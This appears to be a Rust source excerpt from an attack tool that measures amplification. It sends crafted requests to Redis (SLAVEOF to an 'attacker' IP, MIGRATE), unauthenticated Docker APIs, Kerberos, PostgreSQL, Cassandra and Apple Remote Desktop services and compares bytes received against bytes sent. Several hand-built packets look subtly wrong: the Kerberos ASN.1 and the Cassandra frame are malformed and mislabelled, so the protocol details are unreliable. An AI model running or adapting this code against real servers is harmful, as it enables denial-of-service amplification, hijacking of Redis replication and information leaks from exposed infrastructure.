// ================================================================
// Redis SLAVEOF/MIGRATE amplification - port 6379
// Send SLAVEOF command to make Redis server replicate data from
// attacker-controlled server. Minimal request, full replication response.
// ================================================================
async fn redis_slave_read(stream: &mut TcpStream, buf: &mut [u8]) -> Result<(usize, usize), String> {
    let mut sent = 0;
    let mut recv = 0;

    // Read Redis banner
    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    // Send SLAVEOF command with random attacker IP
    let attacker_ip = format!("{}.{}.{}.{}",
        rand::random::<u8>(), rand::random::<u8>(),
        rand::random::<u8>(), rand::random::<u8>());
    let slave_cmd = format!("*3\r\n$7\r\nSLAVEOF\r\n${}\r\n{}\r\n$4\r\n6379\r\n",
        attacker_ip.len(), attacker_ip);
    stream.write_all(slave_cmd.as_bytes()).await.map_err(|e| e.to_string())?;
    sent += slave_cmd.len();

    // Read response
    let timeout = tokio::time::sleep(Duration::from_secs(5));
    tokio::select! {
        n = stream.read(buf) => {
            if let Ok(n) = n { recv += n; }
        }
        _ = timeout => {}
    }

    // Also try MIGRATE for additional amplification
    let migrate_cmd = "*6\r\n$7\r\nMIGRATE\r\n$9\r\n127.0.0.1\r\n$4\r\n6379\r\n$4\r\n1000\r\n$4\r\n6000\r\n$4\r\npass\r\n$4\r\nKEYS\r\n$4\r\n*\r\n";
    stream.write_all(migrate_cmd.as_bytes()).await.ok();
    sent += migrate_cmd.len();

    let timeout = tokio::time::sleep(Duration::from_secs(3));
    tokio::select! {
        n = stream.read(buf) => {
            if let Ok(n) = n { recv += n; }
        }
        _ = timeout => {}
    }

    Ok((sent, recv))
}

// ================================================================
// Docker API info leak - port 2375 (unauthenticated Docker daemon)
// Sends /info request, Docker responds with full system info
// ================================================================
async fn docker_api(stream: &mut TcpStream, buf: &mut [u8]) -> Result<(usize, usize), String> {
    let mut sent = 0;
    let mut recv = 0;

    // Read Docker banner if any
    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    // Send GET /info request
    let req = "GET /info HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n";
    stream.write_all(req.as_bytes()).await.map_err(|e| e.to_string())?;
    sent += req.len();

    // Read full info response (can be 10-100KB)
    let timeout = tokio::time::sleep(Duration::from_secs(5));
    tokio::select! {
        n = stream.read(buf) => {
            if let Ok(n) = n { recv += n; }
        }
        _ = timeout => {}
    }

    // Also try /containers/json for more info
    let req2 = "GET /containers/json?all=1 HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n";
    stream.write_all(req2.as_bytes()).await.ok();
    sent += req2.len();

    let timeout = tokio::time::sleep(Duration::from_secs(3));
    tokio::select! {
        n = stream.read(buf) => {
            if let Ok(n) = n { recv += n; }
        }
        _ = timeout => {}
    }

    Ok((sent, recv))
}

// ================================================================
// Kerberos AS-REQ amplification - port 88
// Send AS-REQ, server does crypto (encryption) and returns AS-REP
// AS-REP can be much larger than AS-REQ
// ================================================================
async fn kerberos_as_req(stream: &mut TcpStream, buf: &mut [u8]) -> Result<(usize, usize), String> {
    let mut sent = 0;
    let mut recv = 0;

    // Read initial response
    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    // Minimal AS-REQ (ASN.1 encoded)
    let as_req = vec![
        0x30, 0x28, // SEQUENCE
        0x02, 0x01, 0x01, // INTEGER: krbv5
        0x30, 0x1E, // SEQUENCE: realm
        0x1B, 0x1C, 0x65, 0x78, 0x61, 0x6D, 0x70, 0x6C, 0x65, 0x2E,
        0x43, 0x4F, 0x4D, // "EXAMPLE.COM"
        0x30, 0x0A, // SEQUENCE: sname
        0x30, 0x08, // SEQUENCE
        0x17, 0x04, 0x6B, 0x72, 0x62, 0x74, // "krbt"
        0x17, 0x04, 0x67, 0x64, 0x6C, 0x64, // "gldd"
        0xA0, 0x27, // [0]: pa-data
        0x30, 0x25, // SEQUENCE
        0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x12, 0x01, 0x02, 0x02, // AE-etype
        0x04, 0x12, // AE-data
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    ];
    stream.write_all(&as_req).await.map_err(|e| e.to_string())?;
    sent += as_req.len();

    // Read AS-REP response (larger than request due to encryption)
    let timeout = tokio::time::sleep(Duration::from_secs(5));
    tokio::select! {
        n = stream.read(buf) => {
            if let Ok(n) = n { recv += n; }
        }
        _ = timeout => {}
    }

    Ok((sent, recv))
}

// ================================================================
// PostgreSQL MD5 Auth amplification - port 5432
// Start MD5 auth handshake, server sends salt (4 bytes)
// Client must compute MD5 hash of password+salt
// This is CPU-intensive for the server to validate
// ================================================================
async fn postgres_md5(stream: &mut TcpStream, buf: &mut [u8]) -> Result<(usize, usize), String> {
    let mut sent = 0;
    let mut recv = 0;

    // Read startup message
    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    // Send startup message requesting MD5 auth
    let startup = vec![
        0x00, 0x00, 0x00, 0x44, // length
        0x00, 0x03, 0x00, 0x00, // version 3.0
        0x75, 0x73, 0x65, 0x72, // "user"
        0x00, 0x72, 0x6F, 0x6F, 0x74, 0x00, // "root"
        0x64, 0x61, 0x74, 0x61, 0x62, 0x61, 0x73, 0x65, 0x00, // "database"
        0x00, 0x00, 0x00,
    ];
    stream.write_all(&startup).await.map_err(|e| e.to_string())?;
    sent += startup.len();

    // Read AuthenticationMD5Password (with 4-byte salt)
    let timeout = tokio::time::sleep(Duration::from_secs(5));
    tokio::select! {
        n = stream.read(buf) => {
            if let Ok(n) = n { recv += n; }
        }
        _ = timeout => {}
    }

    // Compute and send MD5 password response
    let md5_response = vec![
        0x70, // 'p' for PasswordMessage
        0x00, 0x00, 0x00, 0x28, // length
        0x6D, 0x64, 0x35, 0x00, // "md5"
        0x00, // null
    ];
    stream.write_all(&md5_response).await.ok();
    sent += md5_response.len();

    // Read authentication result
    let timeout = tokio::time::sleep(Duration::from_secs(3));
    tokio::select! {
        n = stream.read(buf) => {
            if let Ok(n) = n { recv += n; }
        }
        _ = timeout => {}
    }

    Ok((sent, recv))
}

// ================================================================
// Cassandra Thrift API - port 9042
// Send CQL query, Cassandra processes and returns results
// Can amplify with SELECT * queries
// ================================================================
async fn cassandra_thrift(stream: &mut TcpStream, buf: &mut [u8]) -> Result<(usize, usize), String> {
    let mut sent = 0;
    let mut recv = 0;

    // Read server banner/version
    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    // Minimal CQL request (Cassandra uses Thrift protocol)
    let query = vec![
        0x04, // version 4
        0x00, // flags
        0x00, 0x01, // stream
        0x07, // opcode: REQUEST
        0x00, 0x00, 0x00, 0x24, // body length
        0x03, // message type: ExecuteQuery
        0x00, 0x1C, // body
        0x00, 0x00, 0x00, 0x0B, // query length
        0x53, 0x45, 0x4C, 0x45, 0x43, 0x54, 0x20, 0x2A, // "SELECT *"
        0x20, 0x46, 0x52, 0x4F, 0x4D, 0x20, // " FROM "
        0x69, 0x6E, 0x66, 0x6F, 0x72, 0x6D, 0x61, 0x74, 0x69, 0x6F, 0x6E, // "info"
    ];
    stream.write_all(&query).await.map_err(|e| e.to_string())?;
    sent += query.len();

    // Read response
    let timeout = tokio::time::sleep(Duration::from_secs(5));
    tokio::select! {
        n = stream.read(buf) => {
            if let Ok(n) = n { recv += n; }
        }
        _ = timeout => {}
    }

    Ok((sent, recv))
}

// ================================================================
// Apple Remote Desktop (ARD) Protocol - port 3283
// ARDP protocol, sends discovery query, server responds with
// machine info, can be used for amplification
// ================================================================
async fn ard_query(stream: &mut TcpStream, buf: &mut [u8]) -> Result<(usize, usize), String> {
    let mut sent = 0;
    let mut recv = 0;

    // Read initial handshake
    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    // ARD Protocol discovery query
    let ard_query = vec![
        0x00, 0x1B, // length
        0x04, // command: discovery
        0x00, // flags
        0x00, 0x00, 0x00, 0x00, // timestamp
        0x00, 0x00, 0x00, 0x00, // reserved
        0x00, // type: broadcast discovery
    ];
    stream.write_all(&ard_query).await.map_err(|e| e.to_string())?;
    sent += ard_query.len();

    // Read response (includes machine name, OS version, etc.)
    let timeout = tokio::time::sleep(Duration::from_secs(5));
    tokio::select! {
        n = stream.read(buf) => {
            if let Ok(n) = n { recv += n; }
        }
        _ = timeout => {}
    }

    // Also try authentication query
    let auth_query = vec![
        0x00, 0x25, // length
        0x07, // command: authenticate
        0x00, // flags
        0x00, 0x00, 0x00, 0x00, // timestamp
        0x00, 0x00, 0x00, 0x00, // reserved
        0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, // dummy auth data
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    ];
    stream.write_all(&auth_query).await.ok();
    sent += auth_query.len();

    let timeout = tokio::time::sleep(Duration::from_secs(3));
    tokio::select! {
        n = stream.read(buf) => {
            if let Ok(n) = n { recv += n; }
        }
        _ = timeout => {}
    }

    Ok((sent, recv))
}
